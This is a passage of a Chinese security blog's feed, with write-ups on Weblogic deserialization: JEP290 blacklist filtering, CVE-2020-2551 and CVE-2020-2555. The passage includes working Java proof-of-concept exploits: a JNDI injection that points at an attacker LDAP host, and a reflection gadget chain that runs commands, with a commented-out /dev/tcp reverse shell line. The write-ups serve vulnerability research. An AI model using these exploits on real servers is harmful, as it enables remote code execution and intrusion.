string">"com.bea.core.repackaged.springframework.aop.aspectj.autoproxy"</span><span class="token punctuation">,</span> <span class="token string">"com.bea.core.repackaged.springframework.beans.factory.support"</span><span class="token punctuation">,</span> <span class="token string">"org.python.core"</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">final</span> String<span class="token punctuation">[</span><span class="token punctuation">]</span> DEFAULT_BLACKLIST_CLASSES <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token string">"org.codehaus.groovy.runtime.ConvertedClosure"</span><span class="token punctuation">,</span> <span class="token string">"org.codehaus.groovy.runtime.ConversionHandler"</span><span class="token punctuation">,</span> <span class="token string">"org.codehaus.groovy.runtime.MethodClosure"</span><span class="token punctuation">,</span> <span class="token string">"org.springframework.transaction.support.AbstractPlatformTransactionManager"</span><span class="token punctuation">,</span> <span class="token string">"java.rmi.server.UnicastRemoteObject"</span><span class="token punctuation">,</span> <span class="token string">"java.rmi.server.RemoteObjectInvocationHandler"</span><span class="token punctuation">,</span> <span class="token string">"com.bea.core.repackaged.springframework.transaction.support.AbstractPlatformTransactionManager"</span><span class="token punctuation">,</span> <span class="token string">"java.rmi.server.RemoteObject"</span><span class="token punctuation">}</span><span class="token punctuation">;</span>System<span class="token punctuation">.</span><span class="token function">getProperty</span><span class="token punctuation">(</span><span class="token string">"weblogic.rmi.blacklist"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><h3 id="3-JEP290-in-Weblogic"><a href="#3-JEP290-in-Weblogic" class="headerlink" title="3. JEP290 in Weblogic"></a>3. JEP290 in Weblogic</h3><p>回到 JEP290 调用栈，我们知道最后是调用filterCheck进行的过滤</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/ecb4dfa2/15854773851473.jpg" alt="-w1332"></p><p>跟入，此时serialFilter为sun.misc.ObjectInputFilter对象（注意 JDK 为8u151）</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/ecb4dfa2/15854775780406.jpg" alt="-w1642"></p><pre class=" language-plain"><code class="language-plain">maxdepth=100;!org.codehaus.groovy.runtime.ConvertedClosure;!org.codehaus.groovy.runtime.ConversionHandler;!org.codehaus.groovy.runtime.MethodClosure;!org.springframework.transaction.support.AbstractPlatformTransactionManager;!java.rmi.server.UnicastRemoteObject;!java.rmi.server.RemoteObjectInvocationHandler;!com.bea.core.repackaged.springframework.transaction.support.AbstractPlatformTransactionManager;!java.rmi.server.RemoteObject;!org.apache.commons.collections.functors.*;!com.sun.org.apache.xalan.internal.xsltc.trax.*;!javassist.*;!java.rmi.activation.*;!sun.rmi.server.*;!org.jboss.interceptor.builder.*;!org.jboss.interceptor.reader.*;!org.jboss.interceptor.proxy.*;!org.jboss.interceptor.spi.metadata.*;!org.jboss.interceptor.spi.model.*;!com.bea.core.repackaged.springframework.aop.aspectj.*;!com.bea.core.repackaged.springframework.aop.aspectj.annotation.*;!com.bea.core.repackaged.springframework.aop.aspectj.autoproxy.*;!com.bea.core.repackaged.springframework.beans.factory.support.*;!org.python.core.*</code></pre><p>看上面过滤的类是不是很熟悉，实际也是<code>weblogic.utils.io.oif.WebLogicFilterConfig</code>生成的 filter</p><p>跟入<code>sun.misc.ObjectInputFilter.Config.Global#checkInput</code>，整体代码和registryFilter中的类似，红框处是进行serialFilter黑名单匹配</p><blockquote><p>这里用到了 Function&lt;T, U&gt; 接口和 lambda 语法</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/ecb4dfa2/15854876431547.jpg" alt="-w1608"></p><p>下面是 filter 通过生解析生成过程，需要在 weblogic 启动时下断点观察，传入的值和serialFilter是一致的</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/ecb4dfa2/15855527639904.jpg" alt="-w1400"></p><p>如果返回 null 或者 REJECTED 都会抛出异常结束反序列化流程</p><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ol><li><a href="https://www.anquanke.com/post/id/201432" target="_blank" rel="noopener">Weblogic t3 协议利用与防御</a></li><li><a href="https://paper.seebug.org/728/" target="_blank" rel="noopener">从WebLogic看反序列化漏洞的利用与防御</a></li><li><a href="https://paper.seebug.org/454/" target="_blank" rel="noopener">反序列化漏洞的末日？JEP290机制研究</a></li></ol>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Docker with Weblogic 12.2.1.4.0&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="Weblogic" scheme="https://blog.sari3l.com/tags/Weblogic/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2020-2551 简单分析</title>
    <link href="https://blog.sari3l.com/posts/e32c5d3e/"/>
    <id>https://blog.sari3l.com/posts/e32c5d3e/</id>
    <published>2020-03-20T04:43:47.000Z</published>
    <updated>2020-07-06T09:45:26.702Z</updated>
    
    <content type="html"><![CDATA[<h2 id="搭建"><a href="#搭建" class="headerlink" title="搭建"></a>搭建</h2><ul><li>jdk 8u151</li><li>weblogic 12.1.4.0</li></ul><ol><li>通过<a href="https://github.com/QAX-A-Team/WeblogicEnvironment" target="_blank" rel="noopener">此项目</a>直接生成 docker 并启动，同时根据项目说明添加 Remote 方便进行 debug</li><li>进入 docker 拷贝出以下文件并添加至 poc 项目 Libraries<ul><li>modules/com.bea.core.repackaged.springframework.spring.jar</li><li>server/lib/wlfullclient.jar</li></ul></li></ol><p>注意：wlfullclient.jar在12.1.3版本后被移除，<a href="https://docs.oracle.com/en/middleware/fusion-middleware/weblogic-server/12.2.1.4/saclt/jarbuilder.html#GUID-FEFB26AB-0D48-4D86-BDE2-FDC04F7CE993" target="_blank" rel="noopener">点此查看具体信息</a>，但可以通过以下命令生成</p><pre class=" language-shell"><code class="language-shell">cd WL_HOME/server/libjava -jar wljarbuilder.jar</code></pre><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/e32c5d3e/15844996931979.jpg" alt="-w1072"></p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/e32c5d3e/15846793440437.jpg" alt></p><p>IIOP 协议看的头疼，只好按流程说一下</p><p>每个 IIOP 数据包都会进入<code>weblogic.iiop.ConnectionManager#dispatch</code>进行解析，长度<code>end</code>对应数据对应原始包中数据</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/e32c5d3e/15846250356635.jpg" alt="-w1917"></p><p>直到收到 bind_any 的数据包（这里 wireshark 标记数据有些问题）</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/e32c5d3e/15846279285782.jpg" alt="-w959"></p><p>之后<code>weblogic.rmi.internal.wls.WLSExecuteRequest#run</code>进入<code>weblogic.rmi.internal.BasicServerRef#handleRequest</code>解析请求数据，如果userIdentity、action均不为null（均不用在意），会依次进入</p><ul><li><code>weblogic.rmi.cluster.ClusterableServerRef#invoke</code></li><li><code>weblogic.corba.idl.CorbaServerRef#invoke</code><br><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/e32c5d3e/15846285113448.jpg" alt="-w891"></li></ul><p>如果method不为objectMedthods之一（定义在CorbaServerRef最底部），则会进入<code>this.delegate._invoke</code>即<code>weblogic.corba.cos.naming._NamingContextAnyImplBase#_invoke</code></p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/e32c5d3e/15846290493783.jpg" alt="-w1224"></p><p>通过判断 method 进入对应流程 case，这里进入 case 0</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/e32c5d3e/15846296787933.jpg" alt="-w1209"></p><p>这里通过<code>WNameHelper.read(InputStream istream)</code>读取配置并进行注册，在读取long型数据时会进行4 bytes 对齐</p><p>红色部分为注册个数，黑色部分为对齐忽略部分，橘色为 key，绿色为 value，分别对应<code>id</code>和<code>kind</code></p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/e32c5d3e/15846330998516.jpg" alt="-w549"></p><p>然后关注<code>$result</code>是如何产生的，先后跟入</p><ul><li><code>weblogic.iiop.IIOPInputStream#read_any</code></li><li><code>weblogic.corba.idl.AnyImpl#read_value</code></li></ul><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/e32c5d3e/15846341639516.jpg" alt="-w478"></p><p>首先通过读取类型为<code>1d</code>后，将输入流进行解析</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/e32c5d3e/15846341990330.jpg" alt="-w838"></p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/e32c5d3e/15846339190984.jpg" alt="-w552"></p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/e32c5d3e/15846341251085.jpg" alt="-w586"></p><p>之后进入通过设置 type 进入<code>weblogic.corba.idl.AnyImpl#read_value</code></p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/e32c5d3e/15846343594879.jpg" alt="-w703"></p><p>之后跟入<code>weblogic.corba.idl.AnyImpl#read_value_internal</code>，这里会根据 type 类型(29)尝试获取数据</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/e32c5d3e/15846347052690.jpg" alt="-w676"></p><p>这里会进入<code>weblogic.iiop.IIOPInputStream#read_value()</code>，看到序列化的标志</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/e32c5d3e/15846347768580.jpg" alt="-w415"></p><p>首先会读取 valueTag，（这里出现的<code>getIndirectionValue</code>不知道能不能利用，下来看看），通过查找是否已经有过对应 codebase 避免重复获取，如若没有则会通过之后的数据获取RMI注册表信息</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/e32c5d3e/15846754165917.jpg" alt="-w862"></p><p>对应位置如下，黄绿色为 valueTag，蓝色RMI注册数据长度，绿色为RMI注册内容（之后属性值解析也类似）</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/e32c5d3e/15846760327927.jpg" alt="-w600"></p><p>由于满足<code>ObjectStreamClass.supportsUnsafeSerialization() == true</code>，进入下面的处理逻辑：</p><p>首先通过反射获取实例对象</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/e32c5d3e/15846763190170.jpg" alt="-w1646"></p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/e32c5d3e/15846764221761.jpg" alt="-w857"></p><p>之后进入<code>weblogic.iiop.ValueHandlerImpl#readValue</code>，通过深度遍历将其字段全部读取出来放入<code>indirectionMap</code>内实现完整序列化</p><p>在读取属性值时，跟入到<code>com.bea.core.repackaged.springframework.transaction.jta.JtaTransactionManager#readObject</code></p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/e32c5d3e/15846780406325.jpg" alt="-w767"></p><p>在这里先通过<code>java.io.ObjectInputStream#defaultReadObject</code>会读取属性值到<code>JtaTransactionManager</code>中，同时生成一个 JndiTemplate 实例</p><p>跟入<code>initUserTransactionAndTransactionManager</code>，当userTransaction为空时，会通过从提供的userTransactionName中进行读取</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/e32c5d3e/15846784321693.jpg" alt="-w793"></p><p>一路跟到<code>com.bea.core.repackaged.springframework.jndi.JndiTemplate#execute</code>，剩下就是 JNDI的内容了</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/e32c5d3e/15846788075894.jpg" alt="-w844"></p><h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><ul><li>JtaTransactionManager是spring爆出的一个可以JNDI注入的类，在weblogic中也存在</li><li>weblogic.jndi.WLInitialContextFactory 是weblogic的JNDI工厂类</li></ul><pre class=" language-java"><code class="language-java"><span class="token keyword">import</span> com<span class="token punctuation">.</span>bea<span class="token punctuation">.</span>core<span class="token punctuation">.</span>repackaged<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>transaction<span class="token punctuation">.</span>jta<span class="token punctuation">.</span>JtaTransactionManager<span class="token punctuation">;</span><span class="token keyword">import</span> ysoserial<span class="token punctuation">.</span>payloads<span class="token punctuation">.</span>util<span class="token punctuation">.</span>Gadgets<span class="token punctuation">;</span><span class="token keyword">import</span> javax<span class="token punctuation">.</span>naming<span class="token punctuation">.</span>Context<span class="token punctuation">;</span><span class="token keyword">import</span> javax<span class="token punctuation">.</span>naming<span class="token punctuation">.</span>InitialContext<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span>Remote<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>Hashtable<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">cve_2020_2551</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> Exception <span class="token punctuation">{</span>        String ip <span class="token operator">=</span> <span class="token string">"127.0.0.1"</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// target host</span>        String port <span class="token operator">=</span> <span class="token string">"7001"</span><span class="token punctuation">;</span>       <span class="token comment" spellcheck="true">// target port</span>        String url <span class="token operator">=</span> <span class="token string">"ldap://192.168.31.96:1099/exp2"</span><span class="token punctuation">;</span>      <span class="token comment" spellcheck="true">// rmi/ldap url</span>        Hashtable<span class="token operator">&lt;</span>String<span class="token punctuation">,</span> String<span class="token operator">></span> env <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Hashtable</span><span class="token operator">&lt;</span>String<span class="token punctuation">,</span> String<span class="token operator">></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        env<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"java.naming.factory.initial"</span><span class="token punctuation">,</span> <span class="token string">"weblogic.jndi.WLInitialContextFactory"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        env<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"java.naming.provider.url"</span><span class="token punctuation">,</span> String<span class="token punctuation">.</span><span class="token function">format</span><span class="token punctuation">(</span><span class="token string">"iiop://%s:%s"</span><span class="token punctuation">,</span> ip<span class="token punctuation">,</span> port<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        Context context <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">InitialContext</span><span class="token punctuation">(</span>env<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// get object to Deserialize</span>        JtaTransactionManager jtaTransactionManager <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">JtaTransactionManager</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        jtaTransactionManager<span class="token punctuation">.</span><span class="token function">setUserTransactionName</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">;</span>        Remote remote <span class="token operator">=</span> Gadgets<span class="token punctuation">.</span><span class="token function">createMemoitizedProxy</span><span class="token punctuation">(</span>Gadgets<span class="token punctuation">.</span><span class="token function">createMap</span><span class="token punctuation">(</span><span class="token string">"pwned"</span><span class="token punctuation">,</span> jtaTransactionManager<span class="token punctuation">)</span><span class="token punctuation">,</span> Remote<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        context<span class="token punctuation">.</span><span class="token function">bind</span><span class="token punctuation">(</span><span class="token string">"pwned"</span><span class="token punctuation">,</span> remote<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/e32c5d3e/2020-03-19%2011.14.37.gif" alt="2020-03-19 11.14.37"></p><h2 id="推荐资料"><a href="#推荐资料" class="headerlink" title="推荐资料"></a>推荐资料</h2><ol><li><a href="https://www.anquanke.com/post/id/201005#h3-17" target="_blank" rel="noopener">NAT网络问题</a></li></ol>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;感觉又该重温 JNDI 了。。。&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="RCE" scheme="https://blog.sari3l.com/tags/RCE/"/>
    
      <category term="Weblogic" scheme="https://blog.sari3l.com/tags/Weblogic/"/>
    
      <category term="Deserialize" scheme="https://blog.sari3l.com/tags/Deserialize/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2020-2555 简单分析</title>
    <link href="https://blog.sari3l.com/posts/fa80d225/"/>
    <id>https://blog.sari3l.com/posts/fa80d225/</id>
    <published>2020-03-12T14:47:39.000Z</published>
    <updated>2020-07-06T09:45:26.072Z</updated>
    
    <content type="html"><![CDATA[<p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/fa80d225/15840234109363.jpg" alt></p><h2 id="搭建"><a href="#搭建" class="headerlink" title="搭建"></a>搭建</h2><p>第一次调 weblogic，饶了一大圈 Orz</p><p>推荐：<a href="https://github.com/QAX-A-Team/WeblogicEnvironment" target="_blank" rel="noopener">https://github.com/QAX-A-Team/WeblogicEnvironment</a></p><ol><li>通过上面的项目直接生成 docker 并启动</li><li>从 docker 中拷贝<code>/u01/app/oracle/middleware/wlserver/</code>&amp;<code>/u01/app/oracle/middleware/coherence/</code>出来</li><li>从 idea 打开 wlserver，将其下<code>moudules</code>&amp;<code>server/lib</code>加入 Libraries 中</li><li>将 coherence 目录下 lib 同样加入 Libraries</li><li>添加 remote，启动 debug</li></ol><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/fa80d225/15840233209710.jpg" alt="-w254"></p><h2 id="POP-Chain"><a href="#POP-Chain" class="headerlink" title="POP Chain"></a>POP Chain</h2><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/fa80d225/15840260151465.jpg" alt="-w676"></p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>关键利用点<code>com.tangosol.util.filter.LimitFilter#toString</code>（如果分析过 commons-collections，可能对这里可以很熟悉），这里 m_comparator、m_oAnchorTop均可控，下一步就是看能否有可利用的 extract 函数来进一步发挥</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/fa80d225/15840234657593.jpg" alt="-w1108"></p><p>在<code>com.tangosol.util.extractor.ReflectionExtractor#extract</code>中，可以看到调用了 invoke（这熟悉的味道，难道没有想到 commons-collections 中的 tranform 么）</p><p>即我们可以通过反射执行命令，但需要一条反射链才能从头到尾执行恶意命令（再次回想ChainedTransformer）</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/fa80d225/15840236583179.jpg" alt="-w1184"></p><p>这时关注到<code>com.tangosol.util.extractor.ChainedExtractor#extract</code>，主要在第一步调用时需要传入<code>Runtime.class</code>就可以组成一条完整的调用链，而从<code>LimitFilter</code>传过来<code>m_oAnchorTop</code>的又是可控的</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/fa80d225/15840239207524.jpg" alt="-w575"></p><p>现在命令执行部分已经构造完成，我们需要的是反序列化入口到达<code>LimitFilter#toString</code></p><p>这里又用到了<code>javax.management.BadAttributeValueExpException#BadAttributeValueExpException</code>（又是熟悉的味道，细看commons-collections 5），注意到初始化时需要赋值为 null，再通过反射设置，否则会直接触发<code>toString</code>方法</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/fa80d225/15840241576297.jpg" alt="-w760"></p><h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><pre class=" language-java"><code class="language-java"><span class="token keyword">import</span> com<span class="token punctuation">.</span>tangosol<span class="token punctuation">.</span>util<span class="token punctuation">.</span>extractor<span class="token punctuation">.</span>ChainedExtractor<span class="token punctuation">;</span><span class="token keyword">import</span> com<span class="token punctuation">.</span>tangosol<span class="token punctuation">.</span>util<span class="token punctuation">.</span>extractor<span class="token punctuation">.</span>ReflectionExtractor<span class="token punctuation">;</span><span class="token keyword">import</span> com<span class="token punctuation">.</span>tangosol<span class="token punctuation">.</span>util<span class="token punctuation">.</span>filter<span class="token punctuation">.</span>LimitFilter<span class="token punctuation">;</span><span class="token keyword">import</span> javax<span class="token punctuation">.</span>management<span class="token punctuation">.</span>BadAttributeValueExpException<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>*<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span>Field<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">cve_2020_2555</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> Exception <span class="token punctuation">{</span><span class="token comment" spellcheck="true">//        ((Runtime) Runtime.class.getMethod("getRuntime").invoke(null)).exec(new String[]{""});</span>        ReflectionExtractor<span class="token punctuation">[</span><span class="token punctuation">]</span> reflectionExtractors <span class="token operator">=</span> <span class="token punctuation">{</span>                <span class="token keyword">new</span> <span class="token class-name">ReflectionExtractor</span><span class="token punctuation">(</span>                        <span class="token string">"getMethod"</span><span class="token punctuation">,</span>                        <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token string">"getRuntime"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                <span class="token keyword">new</span> <span class="token class-name">ReflectionExtractor</span><span class="token punctuation">(</span>                        <span class="token string">"invoke"</span><span class="token punctuation">,</span>                        <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span>null<span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">}</span>                <span class="token punctuation">)</span><span class="token punctuation">,</span>                <span class="token keyword">new</span> <span class="token class-name">ReflectionExtractor</span><span class="token punctuation">(</span>                        <span class="token string">"exec"</span><span class="token punctuation">,</span>                        <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token string">"/System/Applications/Calculator.app/Contents/MacOS/Calculator"</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">//                        new Object[]{new String[]{"/bin/sh", "-c", "/bin/sh -i &amp;> /dev/tcp/192.168.31.96/12345 0&lt;&amp;1"}}</span>                <span class="token punctuation">)</span>        <span class="token punctuation">}</span><span class="token punctuation">;</span>        ChainedExtractor chainedExtractor <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ChainedExtractor</span><span class="token punctuation">(</span>reflectionExtractors<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//        chainedExtractor.extract(Runtime.class);</span>        LimitFilter limitFilter <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">LimitFilter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        limitFilter<span class="token punctuation">.</span><span class="token function">setComparator</span><span class="token punctuation">(</span>chainedExtractor<span class="token punctuation">)</span><span class="token punctuation">;</span>        limitFilter<span class="token punctuation">.</span><span class="token function">setTopAnchor</span><span class="token punctuation">(</span>Runtime<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//        limitFilter.toString();</span>        BadAttributeValueExpException badAttributeValueExpException <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">BadAttributeValueExpException</span><span class="token punctuation">(</span>null<span class="token punctuation">)</span><span class="token punctuation">;</span>        Field field <span class="token operator">=</span> badAttributeValueExpException<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"val"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        field<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        field<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>badAttributeValueExpException<span class="token punctuation">,</span> limitFilter<span class="token punctuation">)</span><span class="token punctuation">;</span>        Serializer<span class="token punctuation">.</span><span class="token function">serialize</span><span class="token punctuation">(</span>badAttributeValueExpException<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//        Serializer.deserialize();</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name">Serializer</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">serialize</span><span class="token punctuation">(</span>Object obj<span class="token punctuation">)</span> <span class="token keyword">throws</span> IOException <span class="token punctuation">{</span>        FileOutputStream fos <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FileOutputStream</span><span class="token punctuation">(</span><span class="token string">"payload.bin"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        ObjectOutputStream oos <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectOutputStream</span><span class="token punctuation">(</span>fos<span class="token punctuation">)</span><span class="token punctuation">;</span>        oos<span class="token punctuation">.</span><span class="token function">writeObject</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">deserialize</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> IOException<span class="token punctuation">,</span> ClassNotFoundException <span class="token punctuation">{</span>        FileInputStream ios <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FileInputStream</span><span class="token punctuation">(</span><span class="token string">"java.bin"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        ObjectInputStream ois <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectInputStream</span><span class="token punctuation">(</span>ios<span class="token punctuation">)</span><span class="token punctuation">;</span>        ois<span class="token punctuation">.</span><span class="token function">readObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/fa80d225/cve-2020-2555-1.gif" alt="cve-2020-2555-1"></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;第一次调 weblogic，docker 都下半天&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="RCE" scheme="https://blog.sari3l.com/tags/RCE/"/>
    
      <category term="Weblogic" scheme="https://blog.sari3l.com/tags/Weblogic/"/>
    
      <category term="Deserialize" scheme="https://blog.sari3l.com/tags/Deserialize/"/>
    
  </entry>
  
  <entry>
    <title>Java 反弹 Shell</title>
    <link href="https://blog.sari3l.com/posts/91ba290f/"/>
    <id>https://blog.sari3l.com/posts/91ba290f/</id>
    <published>2020-03-02T14:47:18.000Z</published>
    <updated>2020-07-06T09:45:18.005Z</updated>
    
